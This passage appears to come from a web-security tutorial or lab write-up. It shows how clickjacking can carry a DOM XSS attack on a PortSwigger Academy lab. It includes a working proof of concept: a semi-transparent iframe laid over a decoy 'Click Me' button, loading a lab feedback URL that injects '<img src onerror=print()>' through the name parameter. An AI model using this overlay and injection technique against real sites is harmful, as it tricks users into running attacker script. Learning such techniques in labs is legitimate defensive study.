So far, we have looked at clickjacking as a self-contained attack. Historically, clickjacking has been used to perform behaviors such as boosting "likes" on a Facebook page. However, the true potency of clickjacking is revealed when it is used as a carrier for another attack such as a [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) attack. Implementation of this combined attack is relatively straightforward assuming that the attacker has first identified the XSS exploit. The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack.

Example: We use dom invader to detect and make a exploitable payload and with that, we create our malicious code:

`'<style> 
       iframe { 
              position:relative; 
              width:1024px; 
              height: 860px; 
              opacity: 0.5; 
               z-index: 2; } 
       div { position:absolute; top:811; left:70; z-index: 1; } 
`</style> 
`<div>Click Me</div>
`<iframe src="https://0a7c008604d56b408163fcd100e2006a.web-security-academy.net/feedback?name=<img src onerror=print()>&email=a@a.com&subject=pwnded&message=lol"></iframe>



